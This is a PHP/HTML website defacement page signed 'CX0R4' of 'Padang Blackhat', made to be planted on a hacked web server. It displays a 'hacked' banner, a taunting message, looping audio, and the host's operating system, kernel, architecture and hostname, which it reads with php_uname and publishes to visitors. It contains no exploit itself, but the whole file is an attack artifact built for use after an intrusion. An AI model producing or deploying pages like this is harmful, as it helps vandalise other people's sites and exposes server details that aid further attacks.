<?php
// Ambil info server
$os     = php_uname('s');
$kernel = php_uname('r');
$arch   = php_uname('m');
$host   = php_uname('n');
?>
<!DOCTYPE html>
<!JANGAN DI RECODE BOCAH PANTK!>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>STAMPED BY CX0R4</title>
    <link href="https://fonts.googleapis.com/css2?family=Metal+Mania&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: black;
            color: #CCCCCC;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            max-width: 90%;
            width: 600px;
        }
        .root-line {
            font-size: 14px;
            color: #ffffff;
            margin-bottom: 8px;
        }
        .root-line span {
            color: #ff4d4d;
        }
        .image-container {
            margin-bottom: 20px;
        }
        img {
            width: 100%;
            max-width: 550px;
            border-radius: 10px;
        }
        .hacked-title {
            font-family: 'Metal Mania', cursive;
            color: #ffffff;
            font-size: 28px;
            margin-top: 12px;
            letter-spacing: 2px;
        }
        .content {
            font-size: 16px;
            margin: 6px 0;
        }
        .server-info {
            font-size: 13px;
            margin-top: 10px;
            color: #9b9b9b;
            font-style: italic;
        }
        .footer {
            font-size: 14px;
            font-weight: bold;
            color: #00B7EB;
            margin-top: 12px;
            white-space: nowrap;
        }
    </style>
</head>

<body onclick="document.getElementById('hacked-audio').play()">
<div class="container">

    <div class="root-line">
        root@cx0r4:~# <span>./silent_mode</span>
    </div>

    <div class="image-container">
        <img src="https://i.pinimg.com/564x/25/54/53/255453dcce2e5c0912311ed4495c8c87.jpg" alt="STAMPED BY CX0R4">
    </div>

    <h5 class="hacked-title">STAMPED BY CX0R4</h5>

    <p class="content">I didn't come to destroy, I came to prove...</p>
    <p class="content">That everything you believe is safe is just an illusion.</p>

    <!-- SERVER INFO ASLI -->
    <div class="server-info">
        <?= $os ?> <?= $host ?> | Kernel <?= $kernel ?> (<?= $arch ?>)
    </div>

    <p class="footer">
        --=={ Padang Blackhat - Indonesian Hacker Rulez - Cyber Alpha Wolf }==--
    </p>
</div>

<audio id="hacked-audio" loop>
    <source src="https://e.top4top.io/m_3664dhd420.mp3" type="audio/mpeg">
</audio>
</body>
</html>
